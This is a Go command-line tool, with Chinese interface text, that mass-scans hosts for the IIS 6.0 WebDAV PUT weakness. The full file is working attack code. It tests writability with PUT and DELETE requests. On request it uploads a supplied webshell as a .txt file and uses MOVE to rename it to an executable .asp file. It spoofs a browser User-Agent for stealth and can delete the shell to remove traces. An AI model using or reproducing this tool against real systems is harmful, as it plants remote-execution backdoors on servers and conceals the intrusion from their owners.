package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	target      string
	targetFile  string
	outputFile  string
	shellPath   string
	cleanShell  bool
	concurrency int
)

func init() {
	flag.StringVar(&target, "t", "", "指定单个目标 IP 或域名")
	flag.StringVar(&targetFile, "f", "", "从文件中读取目标列表")
	flag.StringVar(&outputFile, "o", "", "将结果输出到文件")
	flag.StringVar(&shellPath, "shell", "", "上传指定 WebShell 文件路径")
	flag.BoolVar(&cleanShell, "clean", false, "上传后自动删除 WebShell（默认保留）")
	flag.IntVar(&concurrency, "c", 10, "并发扫描数量（默认10）")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `IIS PUT 6.0 隐匿式漏洞扫描器（含上传 WebShell 和清理痕迹）

用法:
  stealth_scanner [选项]

选项:
`)
		flag.PrintDefaults()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	flag.Parse()

	if target == "" && targetFile == "" {
		fmt.Println("错误：请使用 -t 或 -f 指定目标")
		flag.Usage()
		return
	}

	var targets []string
	if target != "" {
		targets = append(targets, target)
	}
	if targetFile != "" {
		file, err := os.Open(targetFile)
		if err != nil {
			fmt.Println("读取目标文件失败:", err)
			return
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" {
				targets = append(targets, line)
			}
		}
	}

	resultChan := make(chan string, len(targets))
	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup

	for _, t := range targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()
			sem <- struct{}{}
			result := ScanTarget(t)
			resultChan <- result
			<-sem
		}(t)
	}

	wg.Wait()
	close(resultChan)

	if outputFile != "" {
		file, err := os.Create(outputFile)
		if err != nil {
			fmt.Println("无法写入文件:", err)
			return
		}
		defer file.Close()
		for result := range resultChan {
			fmt.Fprintln(file, result)
		}
		fmt.Println("扫描结果已保存至:", outputFile)
	} else {
		for result := range resultChan {
			fmt.Println(result)
		}
	}
}

func ScanTarget(target string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	fingerprintURL := fmt.Sprintf("http://%s/", target)
	headReq, _ := http.NewRequest("HEAD", fingerprintURL, nil)
	setStealthHeaders(headReq)
	headResp, err := client.Do(headReq)
	if err != nil {
		return fmt.Sprintf("[%s] [ERROR] 无法连接", target)
	}
	defer headResp.Body.Close()
	serverHeader := headResp.Header.Get("Server")
	isIIS6 := strings.Contains(serverHeader, "Microsoft-IIS/6.0")

	// 如果设置了上传shell
	if shellPath != "" {
		data, err := os.ReadFile(shellPath)
		if err != nil {
			return fmt.Sprintf("[%s] [ERROR] 无法读取 WebShell 文件: %s", target, shellPath)
		}
				ext := filepath.Ext(shellPath)
		tmpName := generateRandomFilenameWithExt(".txt") // 上传为 .txt
		finalName := generateRandomFilenameWithExt(ext)  // 改为 .asp（或用户指定）

		uploadURL := fmt.Sprintf("http://%s/%s", target, tmpName)
		finalURL := fmt.Sprintf("http://%s/%s", target, finalName)

		// Step 1: PUT shell.txt
		putReq, _ := http.NewRequest("PUT", uploadURL, bytes.NewBuffer(data))
		putReq.Header.Set("Content-Type", "text/plain") // 伪装类型
		setStealthHeaders(putReq)
		resp, err := client.Do(putReq)
		if err != nil || !(resp.StatusCode == 201 || resp.StatusCode == 204) {
			return fmt.Sprintf("[%s] [ERROR] WebShell 上传失败 (%d)", target, resp.StatusCode)
		}

		// Step 2: MOVE shell.txt -> shell.asp
		moveReq, _ := http.NewRequest("MOVE", uploadURL, nil)
		moveReq.Header.Set("Destination", finalURL)
		setStealthHeaders(moveReq)
		moveResp, err := client.Do(moveReq)
		if err != nil || !(moveResp.StatusCode == 201 || moveResp.StatusCode == 204) {
			return fmt.Sprintf("[%s] [ERROR] WebShell MOVE 失败 (%d)", target, moveResp.StatusCode)
		}

		msg := fmt.Sprintf("[%s] [SHELL-UPLOADED] %s", target, finalURL)

		if cleanShell {
			delReq, _ := http.NewRequest("DELETE", finalURL, nil)
			setStealthHeaders(delReq)
			client.Do(delReq)
			msg += " | 已自动清理"
		}
		return msg

	}

	// 否则执行漏洞探测
	randomPath := generateRandomFilename() // 生成随机上传路径
	url := fmt.Sprintf("http://%s%s", target, randomPath)
	putReq, _ := http.NewRequest("PUT", url, bytes.NewBuffer([]byte("VulnTest")))
	setStealthHeaders(putReq)
	putReq.Header.Set("Content-Type", "text/plain")

	putResp, err := client.Do(putReq)
	if err != nil {
		return fmt.Sprintf("[%s] [ERROR] PUT 请求失败", target)
	}
	defer putResp.Body.Close()

	if putResp.StatusCode == 201 || putResp.StatusCode == 204 {
		delReq, _ := http.NewRequest("DELETE", url, nil)
		setStealthHeaders(delReq)
		delResp, err := client.Do(delReq)
		cleaned := false
		if err == nil && (delResp.StatusCode == 200 || delResp.StatusCode == 204 || delResp.StatusCode == 404) {
			cleaned = true
		}
		status := "[VULNERABLE]"
		if !isIIS6 {
			status = "[SUSPECTED - 非 IIS6.0]"
		}
		if cleaned {
			return fmt.Sprintf("[%s] %s | Server: %s | 上传成功, 已清理 (%s)", target, status, serverHeader, randomPath)
		}
		return fmt.Sprintf("[%s] %s | Server: %s | 上传成功, 清理失败 (%s)", target, status, serverHeader, randomPath)
	}

	return fmt.Sprintf("[%s] [SAFE] | Server: %s | PUT 被拒绝 (%d)", target, serverHeader, putResp.StatusCode)
}

func setStealthHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0")
}

func generateRandomFilename() string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return fmt.Sprintf("/%s.txt", string(b))
}

func generateRandomFilenameWithExt(ext string) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return fmt.Sprintf("%s%s", string(b), ext)
}

func detectMimeType(ext string) string {
	switch strings.ToLower(ext) {
	case ".asp":
		return "application/octet-stream"
	case ".txt":
		return "text/plain"
	default:
		return "application/octet-stream"
	}
}
